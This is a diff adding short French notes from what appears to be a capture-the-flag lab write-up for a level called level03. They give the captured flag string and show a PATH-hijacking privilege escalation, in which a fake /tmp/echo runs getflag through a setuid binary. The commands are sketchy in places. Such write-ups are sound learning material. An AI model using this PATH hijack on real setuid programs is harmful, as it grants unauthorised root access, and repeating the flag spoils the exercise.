@@ -1,0 +1,29 @@
+flag03: getflag qi0maab88jeaj46qoumi7maus
+
+ls -la
+on obtient l’executabe level03
+./level03 affiche Exploit me
+scp -P 4242 level03@192.168.56.102:/home/user/level03/level03 ./
+scp ./level03 alilin@192.168.56.104:/home/alilin/level03
+
+https://hacksland.net/debugging-binaries-with-gdb
+gdb ./level03
+
+https://manpages.ubuntu.com/manpages/bionic/fr/man2/setresuid.2.html
+
+On reconnaît des appels à setuid et setgid qui nous grant les droits root au moment de l'exécution du programme qui a la fin fait un echo de Exploit me
+https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code
+
+on overwrite le path de echo pour appeler notre executable qu’on appelle echo 
+export PATH=/tmp
+
+touch /tmp/echo
+chmod 777
+nano echo
+dans lequel on execute /bin/getflag
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+puis on rapelle l’executable ./level03
+on obtient donc le flag
+
